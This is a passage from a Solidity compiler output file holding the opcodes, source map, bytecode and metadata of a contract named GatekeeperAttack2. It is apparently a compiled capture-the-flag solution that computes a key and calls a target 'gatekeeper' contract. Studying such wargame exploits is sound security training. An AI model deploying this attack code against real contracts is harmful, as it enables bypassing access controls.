JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x112 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x117 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP POP POP POP PUSH2 0x18E JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x135 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0x14C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 MLOAD PUSH1 0x0 JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0x174 JUMPI PUSH1 0x20 DUP2 DUP7 ADD DUP2 ADD MLOAD DUP6 DUP4 ADD MSTORE ADD PUSH2 0x15A JUMP JUMPDEST DUP2 DUP2 GT ISZERO PUSH2 0x183 JUMPI PUSH1 0x0 DUP3 DUP6 ADD MSTORE JUMPDEST POP SWAP2 SWAP1 SWAP2 ADD SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x3F DUP1 PUSH2 0x19C PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xDA ADDMOD GASPRICE DUP14 SWAP13 PUSH21 0x77DAEE89010DC5ECE77608FDFBADEAA869D307188C PUSH21 0xBDAE42AF64736F6C634300080C0033000000000000 ","sourceMap":"57:288:0:-:0;;;90:253;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;182:31;;-1:-1:-1;;;;;;207:4:0;483:2:1;454:15;450:45;182:31:0;;;438:58:1;133:15:0;;-1:-1:-1;;;;;220:16:0;512:12:1;;182:31:0;;;;;;;;;;;;172:42;;;;;;158:58;;:79;151:87;;133:105;;250:12;268:11;-1:-1:-1;;;;;268:16:0;326:8;285:50;;;;;;;-1:-1:-1;;;;;;697:37:1;;;;679:56;;667:2;652:18;;535:206;285:50:0;;;;-1:-1:-1;;285:50:0;;;;;;;;;;;;;;-1:-1:-1;;;;;285:50:0;-1:-1:-1;;;285:50:0;;;268:68;;;285:50;268:68;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;249:87;;;123:220;;90:253;57:288;;14:290:1;84:6;137:2;125:9;116:7;112:23;108:32;105:52;;;153:1;150;143:12;105:52;179:16;;-1:-1:-1;;;;;224:31:1;;214:42;;204:70;;270:1;267;260:12;204:70;293:5;14:290;-1:-1:-1;;;14:290:1:o;746:426::-;875:3;913:6;907:13;938:1;948:129;962:6;959:1;956:13;948:129;;;1060:4;1044:14;;;1040:25;;1034:32;1021:11;;;1014:53;977:12;948:129;;;1095:6;1092:1;1089:13;1086:48;;;1130:1;1121:6;1116:3;1112:16;1105:27;1086:48;-1:-1:-1;1150:16:1;;;;;746:426;-1:-1:-1;;746:426:1:o;:::-;57:288:0;;;;;;"},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"6080604052600080fdfea2646970667358221220da083a8d9c7477daee89010dc5ece77608fdfbadeaa869d307188c74bdae42af64736f6c634300080c0033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xDA ADDMOD GASPRICE DUP14 SWAP13 PUSH21 0x77DAEE89010DC5ECE77608FDFBADEAA869D307188C PUSH21 0xBDAE42AF64736F6C634300080C0033000000000000 ","sourceMap":"57:288:0:-:0;;;;;"},"methodIdentifiers":{}},"metadata":"{\"compiler\":{\"version\":\"0.8.12+commit.f00d7308\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_gatekeeper\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/attacks/GatekeeperAttack2.sol\":\"GatekeeperAttack2\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":1000},\"remappings\":[]},\"sources\":{\"contracts/attacks/GatekeeperAttack2.sol\":{\"keccak256\":\"0x796ae8c63bb526c6d49d05a6051fbc139233d53c90768c47f22824d454cbada2\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://7f83240c8af8b299fb3e4e54b373861725f56fbd86e3b58d399939ff18641fd3\",\"dweb:/ipfs/QmYJNMR78crZhw5jaUFuuwmA8AfX21RBZuU4BTwapDUkpA\"]}},\"version\":1}"}}}}}